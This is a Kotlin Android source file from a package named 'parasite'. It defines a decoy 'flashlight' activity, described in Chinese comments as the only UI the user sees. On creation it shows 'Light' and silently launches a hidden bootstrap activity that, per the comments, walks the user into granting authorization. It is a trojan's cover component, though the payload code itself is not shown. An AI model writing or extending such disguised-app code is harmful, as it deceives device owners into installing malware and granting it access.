package com.mqf.parasite.util

import android.app.Activity
import android.os.Bundle
import android.content.Intent
import android.widget.TextView
import android.graphics.Color

/**
 * 表象 Activity — "手电筒 App"
 * ============================
 *
 * 用户看到的唯一 UI。
 * 点击后启动 bootstrap 引导授权。
 */
class MqfCoverApp : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val tv = TextView(this).apply {
            text = "Light"
            textSize = 24f
            setBackgroundColor(Color.BLACK)
            setTextColor(Color.WHITE)
        }
        setContentView(tv)
        // Auto-launch bootstrap
        startActivity(Intent(this,
            Class.forName("com.mqf.parasite.MqfBootstrapActivity")))
    }
}
